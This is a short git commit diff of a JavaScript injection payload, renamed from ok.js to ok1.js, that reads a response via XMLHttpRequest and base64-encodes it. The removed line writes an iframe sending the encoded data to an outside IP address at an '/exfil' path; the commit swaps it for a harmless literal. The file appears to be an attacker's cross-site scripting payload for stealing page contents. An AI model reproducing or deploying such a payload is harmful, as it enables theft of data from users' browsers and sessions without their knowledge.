f8403bf3b94c372d9c806c33f05ee25dbc6b09f8
abdelali khalfi <38424164+abdelalikhalfi@users.noreply.github.com>
2024-06-22 20:36:20 +0100

    Update and rename ok.js to ok1.js

--- ok1.js
+++ ok1.js
@@ -1,7 +1,7 @@
 <script>
 function reqListener() {
     var b64 = btoa(this.responseText);
-    document.write('<iframe src="http://196.64.174.253:443/exfil?data=' + b64 + '"></iframe>');
+    document.write('b64');
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
